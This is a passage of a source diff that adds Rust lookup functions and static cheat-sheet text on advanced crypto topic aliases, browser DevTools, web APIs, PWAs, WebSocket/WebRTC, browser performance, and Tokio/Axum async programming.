+            "wildcard-cert",
+            "acme-sh",
+        ],
+        s_ca_pki,
+    ),
+    (
+        "jwt-adv",
+        &[
+            "jwt-advanced",
+            "jwt-vulnerabilities",
+            "jwt-algorithms",
+            "paseto",
+            "oidc-tokens",
+            "jwt-best-practices",
+            "jwt-tool",
+            "alg-none-attack",
+            "rs256-hs256",
+            "access-token",
+            "refresh-token",
+            "jwks",
+        ],
+        s_ca_jwt_adv,
+    ),
+    (
+        "primitives",
+        &[
+            "crypto-primitives",
+            "aes-gcm",
+            "chacha20",
+            "ed25519",
+            "ecdsa",
+            "rsa-oaep",
+            "argon2",
+            "bcrypt-hash",
+            "pbkdf2",
+            "hkdf",
+            "blake2",
+            "csprng",
+            "key-sizes",
+            "encoding-vs-encryption",
+        ],
+        s_ca_crypto_primitives,
+    ),
+    (
+        "mtls",
+        &[
+            "mutual-tls",
+            "client-certificates",
+            "mtls-nginx",
+            "mtls-go",
+            "spiffe-mtls",
+            "cert-pinning",
+            "client-cert",
+            "tls-client-auth",
+            "x509-client",
+            "mtls-microservices",
+            "spire-mtls",
+        ],
+        s_ca_mtls,
+    ),
+];
+
+pub fn crypto_adv_calc(query: &str) -> String {
+    let q = query.trim().to_lowercase();
+    if q.is_empty() || q == "list" || q == "help" {
+        let topics: Vec<&str> = CRYPTO_ADV_SECTIONS.iter().map(|(n, _, _)| *n).collect();
+        return format!(
+            "crypto-adv topics: {}\nUse: --crypto-adv <topic>  or  --crypto-adv all",
+            topics.join(", ")
+        );
+    }
+    if q == "all" {
+        return CRYPTO_ADV_SECTIONS
+            .iter()
+            .map(|(n, _, f)| format!("── {} ──\n{}", n, f()))
+            .collect::<Vec<_>>()
+            .join("\n\n");
+    }
+    for (name, aliases, func) in CRYPTO_ADV_SECTIONS {
+        if q == *name || aliases.iter().any(|a| q == *a || q.contains(a)) {
+            return func().to_string();
+        }
+    }
+    format!(
+        "Unknown crypto-adv topic: '{}'\nAvailable: {}",
+        query.trim(),
+        CRYPTO_ADV_SECTIONS
+            .iter()
+            .map(|(n, _, _)| *n)
+            .collect::<Vec<_>>()
+            .join(", ")
+    )
+}
+
+// ── browser-dev ───────────────────────────────────────────────────────────────
+
+fn s_bd_devtools() -> &'static str {
+    "Browser DevTools Reference
+Network tab:
+  Filter: XHR, Fetch, WS, Doc, CSS, JS, Img, Media, Font
+  Throttling: Slow 3G, Fast 3G, Custom (simulate mobile)
+  HAR export: right-click → Save as HAR (replay in other tools)
+  Preserve log: keep requests across navigation
+  Disable cache: check 'Disable cache' checkbox while DevTools open
+  Request/response headers, timing breakdown, initiator chain
+  Request replay: right-click → Copy as cURL → modify + replay
+
+Performance tab:
+  Record interaction → analyze flame chart
+  Main thread: scripting, rendering, painting, idle
+  Long Tasks: >50ms on main thread (blocking)
+  FPS meter: Rendering → FPS meter
+  Interactions: INP (Interaction to Next Paint)
+  Memory snapshots: identify memory leaks
+
+Core Web Vitals:
+  LCP (Largest Contentful Paint): <2.5s good, >4s poor
+    Optimize: preload key resources, optimize images, reduce TTFB
+  CLS (Cumulative Layout Shift): <0.1 good, >0.25 poor
+    Cause: images without dimensions, late-loading ads, injected content
+    Fix: explicit width/height, min-height for dynamic content
+  INP (Interaction to Next Paint): <200ms good, >500ms poor (replaced FID)
+  FCP (First Contentful Paint): first DOM content renders
+  TTFB (Time to First Byte): server response time
+
+Lighthouse audit:
+  DevTools → Lighthouse tab → Analyze page load
+  CLI: npx lighthouse https://example.com --output html --view
+  Scores: Performance, Accessibility, Best Practices, SEO, PWA
+  lighthouse-ci: integrate into CI pipeline
+
+Console tricks:
+  console.time('label') / console.timeEnd('label')   # measure time
+  console.group / console.groupCollapsed / console.groupEnd
+  console.table(array)                                # tabular display
+  console.trace()                                     # call stack
+  $0  last inspected element; $_ last expression result
+  copy(object)    copy to clipboard
+  document.querySelectorAll('a').length  # quick DOM query
+  performance.now()  high-res timer (sub-millisecond)
+
+Application tab:
+  LocalStorage / SessionStorage / Cookies / IndexedDB
+  Service Worker: status, update, skip waiting, unregister
+  Cache Storage: inspect cached responses
+  Web Push: test push notifications
+
+Sources / Debugger:
+  Ctrl+Shift+F: search across all files
+  Logpoints: right-click line → Add logpoint (no code change needed)
+  Conditional breakpoints: right-click → Add conditional breakpoint
+  Blackboxing: skip third-party scripts in call stack
+  Override files: Sources → Overrides → enable local overrides (persist edits)"
+}
+
+fn s_bd_web_apis() -> &'static str {
+    "Modern Web APIs Reference
+Fetch API:
+  const res = await fetch('/api/users', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token},
+    body: JSON.stringify({name: 'Alice'}),
+    signal: AbortController.signal,    // cancellable
+  });
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+  const data = await res.json();
+
+  Abort: const ctrl = new AbortController(); setTimeout(() => ctrl.abort(), 5000);
+
+  Streaming response:
+    const reader = res.body.getReader();
+    while(true) {
+      const {done, value} = await reader.read();
+      if (done) break;
+      console.log(new TextDecoder().decode(value));
+    }
+
+Intersection Observer (lazy loading):
+  const observer = new IntersectionObserver(entries => {
+    entries.filter(e => e.isIntersecting).forEach(e => {
+      e.target.src = e.target.dataset.src;
+      observer.unobserve(e.target);
+    });
+  }, {rootMargin: '200px'});
+  document.querySelectorAll('img[data-src]').forEach(img => observer.observe(img));
+
+MutationObserver:
+  const observer = new MutationObserver(mutations => {
+    mutations.forEach(m => console.log(m.type, m.addedNodes, m.removedNodes));
+  });
+  observer.observe(document.body, {childList: true, subtree: true, attributes: true});
+
+ResizeObserver:
+  const ro = new ResizeObserver(entries => {
+    entries.forEach(e => console.log(e.contentRect.width, e.contentRect.height));
+  });
+  ro.observe(document.getElementById('container'));
+
+Web Workers:
+  // main.js
+  const worker = new Worker('worker.js');
+  worker.postMessage({data: largeArray});
+  worker.onmessage = e => console.log(e.data.result);
+  // worker.js
+  self.onmessage = e => {
+    const result = heavyComputation(e.data.data);
+    self.postMessage({result});
+  };
+  SharedArrayBuffer + Atomics: shared memory between main thread and workers
+
+Storage APIs:
+  LocalStorage: synchronous; 5–10MB; string only; same origin
+  SessionStorage: same as localStorage but cleared on tab close
+  IndexedDB: async; unlimited; structured data; transactions; use idb library
+  Cache API: for Service Worker response caching
+  cookies: document.cookie; use SameSite=Strict, HttpOnly, Secure flags
+
+Clipboard API:
+  navigator.clipboard.writeText('text');
+  const text = await navigator.clipboard.readText();   // requires user gesture
+
+Geolocation:
+  navigator.geolocation.getCurrentPosition(pos => {
+    console.log(pos.coords.latitude, pos.coords.longitude);
+  }, err => console.error(err), {enableHighAccuracy: true, timeout: 5000});
+
+Notifications API:
+  if (Notification.permission === 'default') await Notification.requestPermission();
+  new Notification('Title', {body: 'Message', icon: '/icon.png'});"
+}
+
+fn s_bd_pwa() -> &'static str {
+    "Progressive Web Apps (PWA) & Service Workers
+Service Worker lifecycle:
+  Install → Activate → Fetch intercept
+  navigator.serviceWorker.register('/sw.js', {scope: '/'})
+  self.addEventListener('install', e => e.waitUntil(caches.open('v1').then(c => c.addAll(ASSETS))));
+  self.addEventListener('activate', e => e.waitUntil(caches.keys().then(keys => Promise.all(keys.filter(k => k !== 'v1').map(k => caches.delete(k))))));
+  self.addEventListener('fetch', e => e.respondWith(caches.match(e.request).then(r => r || fetch(e.request))));
+
+Caching strategies:
+  Cache-first: serve from cache; fallback to network (offline support)
+  Network-first: try network; fallback to cache (fresh data preferred)
+  Stale-while-revalidate: serve cache; update in background
+  Cache-only: always serve from cache (static assets)
+  Network-only: always fetch (real-time data)
+
+Workbox (Google, SW library):
+  import {registerRoute} from 'workbox-routing';
+  import {CacheFirst, NetworkFirst} from 'workbox-strategies';
+  registerRoute(({request}) => request.destination === 'image', new CacheFirst({cacheName: 'images'}));
+  registerRoute(({url}) => url.pathname.startsWith('/api'), new NetworkFirst());
+
+Web App Manifest (manifest.json):
+  {
+    \"name\": \"My App\",
+    \"short_name\": \"App\",
+    \"start_url\": \"/\",
+    \"display\": \"standalone\",
+    \"background_color\": \"#ffffff\",
+    \"theme_color\": \"#2196F3\",
+    \"icons\": [{\"src\": \"/icon-192.png\", \"sizes\": \"192x192\", \"type\": \"image/png\"}]
+  }
+  <link rel=\"manifest\" href=\"/manifest.json\">
+  <meta name=\"theme-color\" content=\"#2196F3\">
+
+Install prompt:
+  window.addEventListener('beforeinstallprompt', e => {
+    e.preventDefault();
+    deferredPrompt = e;
+    showInstallButton();
+  });
+  installButton.addEventListener('click', () => deferredPrompt.prompt());
+
+Push notifications:
+  const sub = await reg.pushManager.subscribe({userVisibleOnly: true, applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY)});
+  await fetch('/subscribe', {method: 'POST', body: JSON.stringify(sub)});
+  // Server-side: web-push library → webpush.sendNotification(sub, JSON.stringify({title, body}))
+
+Background Sync:
+  reg.sync.register('send-message');
+  self.addEventListener('sync', e => {
+    if (e.tag === 'send-message') e.waitUntil(sendQueuedMessages());
+  });
+
+PWA requirements (Lighthouse):
+  HTTPS (or localhost)
+  Valid Web App Manifest with icons
+  Registered Service Worker with fetch handler
+  Responsive design, fast enough metrics"
+}
+
+fn s_bd_websocket() -> &'static str {
+    "WebSocket & WebRTC Reference
+WebSocket basics:
+  const ws = new WebSocket('wss://api.example.com/ws');
+  ws.onopen = () => ws.send(JSON.stringify({type: 'subscribe', channel: 'prices'}));
+  ws.onmessage = e => {
+    const msg = JSON.parse(e.data);
+    console.log(msg);
+  };
+  ws.onerror = e => console.error(e);
+  ws.onclose = e => console.log('closed', e.code, e.reason);
+  ws.close(1000, 'normal closure');
+
+  WebSocket states: CONNECTING(0), OPEN(1), CLOSING(2), CLOSED(3)
+  readyState: ws.readyState
+
+Reconnection pattern:
+  function connect() {
+    const ws = new WebSocket(URL);
+    ws.onclose = () => setTimeout(connect, 1000 * Math.min(30, reconnects++));
+    return ws;
+  }
+
+Server-Sent Events (SSE, simpler than WS):
+  const sse = new EventSource('/events');
+  sse.onmessage = e => console.log(e.data);
+  sse.addEventListener('update', e => console.log(e.data));
+  // Server sends: data: hello\\n\\n    event: update\\ndata: {...}\\n\\n
+  HTTP/1.1 streaming: Content-Type: text/event-stream; Cache-Control: no-cache
+
+Socket.io (abstraction over WebSocket + fallbacks):
+  io('https://server', {transports: ['websocket']})  // force WebSocket
+  socket.emit('message', data);
+  socket.on('response', data => console.log(data));
+  Rooms: socket.join('room1'); io.to('room1').emit('event', data);
+
+WebRTC basics:
+  Use cases: P2P video/audio calls, data channels, screen sharing
+  APIs: RTCPeerConnection, RTCDataChannel, MediaDevices.getUserMedia
+  Signaling (not in WebRTC spec — use WebSocket/HTTP):
+    Exchange SDP (Session Description Protocol) offers/answers
+    Exchange ICE candidates (NAT traversal)
+  STUN: get public IP (NAT traversal); free public servers
+  TURN: relay server (if STUN fails; expensive)
+
+getUserMedia:
+  const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+  videoElement.srcObject = stream;
+  const [track] = stream.getVideoTracks();
+  console.log(track.getSettings());  // resolution, frameRate, deviceId
+
+Screen share:
+  const stream = await navigator.mediaDevices.getDisplayMedia({video: {cursor: 'always'}});
+
+WebRTC data channel:
+  const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+  const dc = pc.createDataChannel('chat');
+  dc.onopen = () => dc.send('hello');
+  dc.onmessage = e => console.log(e.data);"
+}
+
+fn s_bd_performance() -> &'static str {
+    "Browser Performance Optimization
+Critical Rendering Path:
+  HTML parse → DOM → CSSOM → Render Tree → Layout → Paint → Composite
+  Render-blocking: CSS in <head>; JS without async/defer
+  Fix: inline critical CSS; async/defer scripts; preload key resources
+
+Resource hints:
+  <link rel=\"preload\" href=\"font.woff2\" as=\"font\" crossorigin>    # must-fetch resources
+  <link rel=\"prefetch\" href=\"/next-page.html\">                      # likely future nav
+  <link rel=\"preconnect\" href=\"https://api.example.com\">           # early TCP+TLS
+  <link rel=\"dns-prefetch\" href=\"https://fonts.googleapis.com\">    # just DNS
+
+Image optimization:
+  <img src=\"img.webp\" loading=\"lazy\" decoding=\"async\" width=\"400\" height=\"300\">
+  srcset: multiple resolutions
+    <img src=\"img-1x.webp\" srcset=\"img-1x.webp 1x, img-2x.webp 2x\">
+  sizes: adaptive: <img sizes=\"(max-width: 600px) 100vw, 50vw\" srcset=\"...\">
+  Modern formats: WebP (25-35% smaller than JPEG), AVIF (50% smaller)
+  LCP image: add fetchpriority=\"high\" rel=\"preload\"
+
+JavaScript optimization:
+  Code splitting: dynamic import() for routes/components
+  Tree shaking: unused exports removed by bundler (ESM only)
+  Minimize main thread work: defer non-critical JS; use Web Workers
+  requestAnimationFrame: for animations (synced to display refresh)
+  requestIdleCallback: for non-urgent work during idle periods
+  Avoid layout thrashing: batch DOM reads then writes; don't interleave
+
+CSS optimization:
+  Critical CSS: inline above-the-fold styles; defer rest
+  will-change: transform; — hint GPU compositing (use sparingly)
+  contain: layout style paint; — limit style recalculation scope
+  content-visibility: auto; — skip off-screen rendering
+  CSS @layer: manage specificity; prevent specificity wars
+
+Bundle analysis:
+  webpack: webpack-bundle-analyzer
+  vite: rollup-plugin-visualizer
+  next.js: @next/bundle-analyzer
+  npx source-map-explorer dist/bundle.js  # explore what's in bundle
+
+Performance budget:
+  Lighthouse score ≥ 90; LCP < 2.5s; CLS < 0.1; INP < 200ms
+  Bundle: <200KB JS (gzipped); <50KB CSS
+  Total requests: <50; Total size: <1MB
+  Tools: bundlesize, size-limit, Lighthouse CI"
+}
+
+type BrowserDevSection = (&'static str, &'static [&'static str], fn() -> &'static str);
+const BROWSER_DEV_SECTIONS: &[BrowserDevSection] = &[
+    (
+        "devtools",
+        &[
+            "browser-devtools",
+            "chrome-devtools",
+            "network-tab",
+            "performance-tab",
+            "core-web-vitals",
+            "lighthouse-audit",
+            "console-tricks",
+            "sources-debugger",
+            "application-tab",
+            "logpoints",
+            "devtools-tips",
+        ],
+        s_bd_devtools,
+    ),
+    (
+        "web-apis",
+        &[
+            "modern-web-apis",
+            "fetch-api",
+            "intersection-observer",
+            "mutation-observer",
+            "resize-observer",
+            "web-workers",
+            "shared-array-buffer",
+            "indexeddb",
+            "clipboard-api",
+            "storage-api",
+            "notifications-api",
+        ],
+        s_bd_web_apis,
+    ),
+    (
+        "pwa",
+        &[
+            "progressive-web-app",
+            "service-workers",
+            "service-worker-lifecycle",
+            "workbox",
+            "web-app-manifest",
+            "install-prompt",
+            "push-notifications",
+            "background-sync",
+            "caching-strategies-sw",
+            "pwa-requirements",
+        ],
+        s_bd_pwa,
+    ),
+    (
+        "websocket",
+        &[
+            "websocket-api",
+            "sse-events",
+            "server-sent-events",
+            "socket-io",
+            "webrtc",
+            "getuseermedia",
+            "screen-share",
+            "webrtc-data-channel",
+            "stun-turn",
+            "signaling",
+            "reconnect-websocket",
+        ],
+        s_bd_websocket,
+    ),
+    (
+        "performance",
+        &[
+            "browser-performance",
+            "critical-rendering-path",
+            "resource-hints",
+            "image-optimization",
+            "js-optimization",
+            "css-optimization",
+            "bundle-analysis",
+            "performance-budget",
+            "code-splitting",
+            "tree-shaking",
+            "layout-thrashing",
+            "content-visibility",
+        ],
+        s_bd_performance,
+    ),
+];
+
+pub fn browser_dev_calc(query: &str) -> String {
+    let q = query.trim().to_lowercase();
+    if q.is_empty() || q == "list" || q == "help" {
+        let topics: Vec<&str> = BROWSER_DEV_SECTIONS.iter().map(|(n, _, _)| *n).collect();
+        return format!(
+            "browser-dev topics: {}\nUse: --browser-dev <topic>  or  --browser-dev all",
+            topics.join(", ")
+        );
+    }
+    if q == "all" {
+        return BROWSER_DEV_SECTIONS
+            .iter()
+            .map(|(n, _, f)| format!("── {} ──\n{}", n, f()))
+            .collect::<Vec<_>>()
+            .join("\n\n");
+    }
+    for (name, aliases, func) in BROWSER_DEV_SECTIONS {
+        if q == *name || aliases.iter().any(|a| q == *a || q.contains(a)) {
+            return func().to_string();
+        }
+    }
+    format!(
+        "Unknown browser-dev topic: '{}'\nAvailable: {}",
+        query.trim(),
+        BROWSER_DEV_SECTIONS
+            .iter()
+            .map(|(n, _, _)| *n)
+            .collect::<Vec<_>>()
+            .join(", ")
+    )
+}
+
+// ── rust-async ────────────────────────────────────────────────────────────────
+
+fn s_ra_tokio() -> &'static str {
+    "Tokio Runtime Reference
+Cargo.toml:
+  [dependencies]
+  tokio = { version = \"1\", features = [\"full\"] }
+  # Or minimal: features = [\"rt-multi-thread\", \"macros\", \"net\", \"io-util\", \"sync\", \"time\"]
+
+Entry point:
+  #[tokio::main]                         // macro; spawns multi-thread runtime
+  async fn main() -> anyhow::Result<()> {
+      Ok(())
+  }
+  // Equivalent:
+  fn main() {
+      tokio::runtime::Runtime::new().unwrap()
+          .block_on(async { ... });
+  }
+
+Spawning tasks:
+  let handle = tokio::spawn(async { compute().await });
+  let result = handle.await?;           // join; propagates panics as Err
+
+  // Detached (fire and forget):
+  tokio::spawn(async move { work().await; });
+
+join! (concurrent, same task):
+  let (a, b, c) = tokio::join!(fut_a(), fut_b(), fut_c());
+  // All run concurrently; waits for all to complete
+
+try_join! (concurrent, error propagates):
+  let (a, b) = tokio::try_join!(fetch_a(), fetch_b())?;
+
+select! (first wins):
+  tokio::select! {
+      result = tcp.read(&mut buf) => { /* handle */ }
+      _ = shutdown_signal => break,
+      _ = tokio::time::sleep(Duration::from_secs(30)) => { /* timeout */ }
+  }
+
+Timers:
+  tokio::time::sleep(Duration::from_millis(100)).await;
+  let interval = tokio::time::interval(Duration::from_secs(1));
+  interval.tick().await;
+  tokio::time::timeout(Duration::from_secs(5), future).await??;
+
+Runtime configuration:
+  tokio::runtime::Builder::new_multi_thread()
+      .worker_threads(4)
+      .enable_all()
+      .build()?
+      .block_on(main_future())
+
+  Builder::new_current_thread()         // single-threaded (tests, small tools)
+
+tokio::task::spawn_blocking:
+  // Run blocking code without stalling async runtime
+  let result = tokio::task::spawn_blocking(|| {
+      std::fs::read_to_string(\"/large/file.txt\")  // blocking I/O
+  }).await??;
+
+Graceful shutdown:
+  let (tx, rx) = tokio::sync::broadcast::channel(1);
+  tokio::select! {
+      _ = tokio::signal::ctrl_c() => { tx.send(()).ok(); }
+      _ = rx.recv() => {}
+  }"
+}
+
+fn s_ra_channels() -> &'static str {
+    "Tokio Channels & Sync Primitives
+Channel types:
+  mpsc (multi-producer, single-consumer): work queues, fan-in
+  oneshot: single-value response (request/response)
+  broadcast: fan-out (all receivers get every message)
+  watch: latest-value-only (config updates, state changes)
+
+mpsc:
+  let (tx, mut rx) = tokio::sync::mpsc::channel::<String>(32);  // buffered
+  let (tx2, mut rx2) = tokio::sync::mpsc::unbounded_channel();  // unbounded
+
+  tokio::spawn(async move { tx.send(\"hello\".to_string()).await.unwrap(); });
+  while let Some(msg) = rx.recv().await { println!(\"{msg}\"); }
+
+oneshot:
+  let (tx, rx) = tokio::sync::oneshot::channel::<i32>();
+  tokio::spawn(async move { tx.send(42).unwrap(); });
+  let result = rx.await.unwrap();
+
+broadcast:
+  let (tx, mut rx1) = tokio::sync::broadcast::channel::<String>(16);
+  let mut rx2 = tx.subscribe();
+  tx.send(\"event\".to_string()).unwrap();
+  let msg = rx1.recv().await.unwrap();
+
+watch:
+  let (tx, rx) = tokio::sync::watch::channel(0u32);
+  tx.send(1).unwrap();
+  let val = *rx.borrow();               // get current value
+  rx.changed().await.unwrap();         // wait for change
+  let new_val = *rx.borrow_and_update();
+
+Mutex / RwLock:
+  let shared = Arc::new(tokio::sync::Mutex::new(HashMap::new()));
+  let guard = shared.lock().await;      // async; doesn't block thread
+  // Use std::sync::Mutex for brief holds (no .await while locked)
+
+Semaphore:
+  let sem = Arc::new(tokio::sync::Semaphore::new(10));  // 10 concurrent
+  let permit = sem.acquire().await.unwrap();
+  // permit dropped → semaphore released
+  // Connection pool pattern: sem.try_acquire() for non-blocking
+
+Notify:
+  let notify = Arc::new(tokio::sync::Notify::new());
+  notify.notify_one();          // wake one waiter
+  notify.notify_waiters();      // wake all waiters
+  notify.notified().await;      // wait to be notified
+
+Barrier:
+  let barrier = Arc::new(tokio::sync::Barrier::new(3));
+  barrier.wait().await;         // all 3 tasks must reach before any continues
+
+RwLock:
+  let lock = Arc::new(tokio::sync::RwLock::new(vec![]));
+  let read = lock.read().await;    // shared read
+  let mut write = lock.write().await;  // exclusive write"
+}
+
+fn s_ra_streams() -> &'static str {
+    "Async Streams & Futures
+futures crate:
+  [dependencies]
+  futures = \"0.3\"
+  use futures::{Stream, StreamExt, FutureExt, TryFutureExt, TryStreamExt};
+
+Stream basics:
+  use futures::stream::{self, StreamExt};
+  let mut s = stream::iter(vec![1, 2, 3]);
+  while let Some(val) = s.next().await { println!(\"{val}\"); }
+  let sum: i32 = stream::iter(1..=10).fold(0, |acc, x| async move { acc + x }).await;
+
+tokio_stream:
+  use tokio_stream::StreamExt;
+  use tokio_stream::wrappers::ReceiverStream;
+  let (tx, rx) = tokio::sync::mpsc::channel(32);
+  let mut stream = ReceiverStream::new(rx);
+  while let Some(item) = stream.next().await { ... }
+
+async_stream macro:
+  use async_stream::stream;
+  let s = stream! {
+      for i in 0..10 {
+          tokio::time::sleep(Duration::from_millis(10)).await;
+          yield i;
+      }
+  };
+  pin_mut!(s);
+  while let Some(val) = s.next().await { ... }
+
+Stream combinators:
+  stream.map(|x| async move { transform(x).await })
+        .buffer_unordered(10)      // 10 concurrent transforms
+        .collect::<Vec<_>>().await
+
+  stream.for_each_concurrent(10, |item| async move { process(item).await }).await;
+  stream.take(5)                   // limit
+  stream.filter(|x| future::ready(*x > 0))
+  stream.chunks(100)               // batch items
+  stream.timeout(Duration::from_secs(1))  // per-item timeout (tokio-stream)
+
+Pin and Unpin:
+  Box<dyn Future<Output=T> + Send>    // heap-allocated future
+  async fn foo() -> T { ... }        // impl Future<Output=T>
+  pin_mut!(fut)                       // stack-pin a future
+  Box::pin(fut)                       // heap-pin
+  // Recursive async needs Box::pin to avoid infinite-size type
+
+FutureExt:
+  fut.boxed()               // Box<dyn Future>
+  fut.boxed_local()         // Box<dyn Future> (!Send)
+  fut.fuse()                // can call select! multiple times safely
+  fut.shared()              // multiple awaiters on same future
+  future::ready(value)      // immediately resolving future
+  future::pending()         // never resolves
+  future::join(a, b)        // concurrent (like tokio::join!)"
+}
+
+fn s_ra_axum() -> &'static str {
+    "Axum Web Framework Reference
+Cargo.toml:
+  axum = { version = \"0.7\", features = [\"macros\"] }
+  tokio = { version = \"1\", features = [\"full\"] }
+  tower = \"0.4\"
+  tower-http = { version = \"0.5\", features = [\"cors\", \"trace\", \"compression-gzip\"] }
+  serde = { version = \"1\", features = [\"derive\"] }
+
+Minimal app:
+  use axum::{Router, routing::get, response::Json};
+  use serde_json::{json, Value};
+
+  #[tokio::main]
+  async fn main() {
+      let app = Router::new().route(\"/\", get(root)).route(\"/api/users\", get(list_users));
+      let listener = tokio::net::TcpListener::bind(\"0.0.0.0:3000\").await.unwrap();
+      axum::serve(listener, app).await.unwrap();
+  }
+  async fn root() -> &'static str { \"Hello, World!\" }
+  async fn list_users() -> Json<Value> { Json(json!([{\"id\": 1}])) }
+
+Extractors:
+  Path params:   async fn get_user(Path(id): Path<u32>) -> impl IntoResponse
+  Query params:  async fn search(Query(params): Query<SearchParams>) -> impl IntoResponse
+  JSON body:     async fn create(Json(body): Json<CreateUser>) -> impl IntoResponse
+  State:         async fn handler(State(db): State<DbPool>) -> impl IntoResponse
+  Headers:       async fn handler(TypedHeader(auth): TypedHeader<Authorization<Bearer>>)
+  Form:          async fn handler(Form(data): Form<LoginForm>) -> impl IntoResponse
+
+Router with state:
+  let app = Router::new()
+      .route(\"/users\", get(list_users).post(create_user))
+      .route(\"/users/:id\", get(get_user).put(update_user).delete(delete_user))
+      .nest(\"/api/v1\", api_router())
+      .with_state(db_pool)
+      .layer(TraceLayer::new_for_http())
+      .layer(CorsLayer::permissive());
+
+Middleware (Tower layers):
+  use tower_http::{trace::TraceLayer, cors::CorsLayer, compression::CompressionLayer};
+  app.layer(axum::middleware::from_fn(my_middleware))
+  async fn my_middleware(State(s): State<AppState>, req: Request, next: Next) -> Response {
+      let response = next.run(req).await;
+      response
+  }
+
+Error handling:
+  impl IntoResponse for AppError { ... }
+  // Or: use axum::response::Result<Json<User>, StatusCode>
+  async fn handler() -> Result<Json<User>, (StatusCode, String)> { ... }
+
+WebSocket:
+  use axum::extract::ws::{WebSocket, WebSocketUpgrade};
+  async fn ws_handler(ws: WebSocketUpgrade) -> impl IntoResponse {
+      ws.on_upgrade(|socket| handle_socket(socket))
+  }
+  async fn handle_socket(mut socket: WebSocket) {
+      while let Some(Ok(msg)) = socket.recv().await {
+          socket.send(msg).await.ok();
+      }
+  }"
+}
+
+fn s_ra_patterns() -> &'static str {
+    "Rust Async Patterns
+Async trait (Rust 1.75+):
+  trait MyTrait {
+      async fn method(&self) -> Result<String, Error>;  // stable since 1.75
+  }
+  // Pre-1.75: async_trait crate
+  #[async_trait::async_trait]
+  trait OldTrait {
+      async fn method(&self) -> Result<String, Error>;
+  }
+
+Error handling in async:
+  use anyhow::{Result, Context};
+  async fn fetch(url: &str) -> Result<String> {
+      let res = reqwest::get(url).await.context(\"request failed\")?;
+      let text = res.text().await.context(\"body read failed\")?;
+      Ok(text)
+  }
+  // ? operator works in async fns normally
+
+Concurrent request pattern:
+  use futures::future::join_all;
+  let urls = vec![\"https://api1\", \"https://api2\", \"https://api3\"];
+  let futures = urls.iter().map(|u| fetch(u));
+  let results: Vec<Result<String>> = join_all(futures).await;
+  // Or with bounded concurrency:
+  use futures::StreamExt;
+  let results: Vec<_> = futures::stream::iter(urls)
+      .map(|u| async move { fetch(u).await })
+      .buffer_unordered(3)
+      .collect().await;
+
+Actor pattern (with Tokio):
+  struct Actor { rx: mpsc::Receiver<Message> }
+  impl Actor {
+      async fn run(mut self) {
+          while let Some(msg) = self.rx.recv().await { self.handle(msg).await; }
+      }
+  }
+  let (tx, rx) = mpsc::channel(32);
+  tokio::spawn(Actor { rx }.run());
+  tx.send(Message::DoWork { ... }).await?;
+
+Cancellation-safe patterns:
+  // Problem: select! drops non-completing futures
+  // Safe: futures that can be dropped at any await point
+  // Unsafe: if state corruption occurs on cancellation
+  // Pattern: use CancellationToken (tokio_util::sync)
+  use tokio_util::sync::CancellationToken;
+  let token = CancellationToken::new();
+  let child = token.child_token();
+  tokio::spawn(async move {
+      tokio::select! {
+          _ = child.cancelled() => println!(\"cancelled\"),
+          _ = do_work() => println!(\"done\"),
+      }
+  });
+  token.cancel();
+
+Tracing (structured async observability):
+  use tracing::{info, warn, error, instrument};
+  #[instrument(fields(user_id = %id))]
+  async fn fetch_user(id: u64) -> Result<User> { info!(\"fetching user\"); ... }
+  // setup:
+  tracing_subscriber::fmt::init();
+  // or JSON for production:
+  tracing_subscriber::fmt().json().init();"
+}
+
+type RustAsyncSection = (&'static str, &'static [&'static str], fn() -> &'static str);
+const RUST_ASYNC_SECTIONS: &[RustAsyncSection] = &[
+    (
+        "tokio",
+        &[
+            "tokio-runtime",
+            "tokio-main",
+            "tokio-spawn",
+            "tokio-join",
+            "tokio-select",
+            "tokio-timer",
+            "tokio-sleep",
+            "tokio-timeout",
+            "spawn-blocking",
+            "tokio-shutdown",
+            "tokio-config",
+            "current-thread",
+        ],
+        s_ra_tokio,
+    ),
+    (
+        "channels",
+        &[
+            "tokio-channels",
+            "mpsc-channel",
+            "oneshot-channel",
+            "broadcast-channel",
+            "watch-channel",
+            "tokio-mutex",
+            "tokio-semaphore",
+            "tokio-notify",
+            "tokio-barrier",
+            "tokio-rwlock",
+            "async-mutex",
+            "arc-mutex",
+        ],
+        s_ra_channels,
+    ),
+    (
+        "streams",
+        &[
+            "async-streams",
+            "tokio-stream",
+            "stream-ext",
+            "async-stream",
+            "futures-stream",
+            "buffer-unordered",
+            "for-each-concurrent",
+            "pin-future",
+            "boxed-future",
+            "future-ext",
+            "stream-combinators",
+            "try-stream",
+        ],
+        s_ra_streams,
+    ),
+    (
+        "axum",
+        &[
+            "axum-framework",
+            "axum-router",
+            "axum-extractors",
+            "axum-state",
+            "axum-middleware",
+            "axum-error",
+            "axum-websocket",
+            "tower-http",
+            "tower-layer",
+            "axum-json",
+            "axum-path",
+            "axum-query",
+        ],
+        s_ra_axum,
+    ),
+    (
+        "patterns",
+        &[
+            "async-patterns",
+            "async-trait",
+            "async-error",
+            "concurrent-requests",
+            "actor-pattern",
+            "cancellation-token",
+            "tokio-util",
+            "tracing-async",
+            "async-cancellation",
+            "async-actor",
+            "join-all",
+            "buffer-unordered-pattern",
+        ],
+        s_ra_patterns,
+    ),
+];
+
+pub fn rust_async_calc(query: &str) -> String {
+    let q = query.trim().to_lowercase();
+    if q.is_empty() || q == "list" || q == "help" {
+        let topics: Vec<&str> = RUST_ASYNC_SECTIONS.iter().map(|(n, _, _)| *n).collect();
+        return format!(
+            "rust-async topics: {}\nUse: --rust-async <topic>  or  --rust-async all",
+            topics.join(", ")
+        );
+    }
+    if q == "all" {
+        return RUST_ASYNC_SECTIONS
+            .iter()
+            .map(|(n, _, f)| format!("── {} ──\n{}", n, f()))
+            .collect::<Vec<_>>()
+            .join("\n\n");
+    }
+    for (name, aliases, func) in RUST_ASYNC_SECTIONS {
+        if q == *name || aliases.iter().any(|a| q == *a || q.contains(a)) {
+            return func().to_string();
+        }
+    }
+    format!(
+        "Unknown rust-async topic: '{}'\nAvailable: {}",
+        query.trim(),
+        RUST_ASYNC_SECTIONS
+            .iter()
+            .map(|(n, _, _)| *n)
+            .collect::<Vec<_>>()
+            .join(", ")
+    )
+}
